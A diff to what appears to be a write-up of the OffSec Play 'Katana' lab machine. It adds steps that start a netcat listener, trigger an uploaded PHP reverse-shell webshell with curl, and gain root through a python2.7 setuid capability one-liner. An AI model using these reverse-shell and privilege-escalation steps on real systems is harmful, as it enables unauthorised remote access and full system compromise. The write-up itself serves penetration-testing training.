@@ -322,7 +322,31 @@ http://192.168.172.83:8088/upload.html
 File Upload:
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/9179b079-529a-4f25-931b-37338d25e978)
 
+Start Netcat listener:
+```shell
+rlwrap nc -nlvvp 1337
+```
+
 Trigger the webshell:
 ```curl
 > curl http://192.168.172.83:8715/katana_php-reverse-shell.php
 ```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/6c2ca910-bc0b-4cdd-961f-d2582e1bd441)
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/5e58a576-197b-4e50-95d1-aa07e00d68b0)
+
+Tried to crack the passwords but did not work.
+
+Linpeas:
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4b762900-e5ec-41f7-bd42-cdc29db541cf)
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/32e0cf34-58e5-4674-8928-7f5c5b14d2d6)
+
+Privilege Escalation using Capabilities
+```shell
+getcap -r / 2>/dev/null
+pwd
+ls -al python2.7
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/867ff8c1-2a00-4157-9d46-9d82c5fee376)
+
